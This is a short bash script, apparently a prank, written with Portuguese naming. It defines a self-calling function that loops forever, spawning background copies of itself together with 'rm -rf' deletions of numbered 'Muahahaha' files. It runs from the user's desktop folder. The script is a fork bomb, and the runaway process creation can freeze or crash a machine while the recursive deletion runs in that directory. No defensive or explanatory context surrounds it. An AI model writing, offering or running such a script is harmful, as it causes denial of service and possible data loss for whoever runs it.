amemirmao(){
	while [ true ]
	do
		rm -rf Muahahaha{-666..666}-$1 &
		amemirmao `expr $1+$1` &
	done
}

cd ~/"Área de Trabalho"

amemirmao 666;
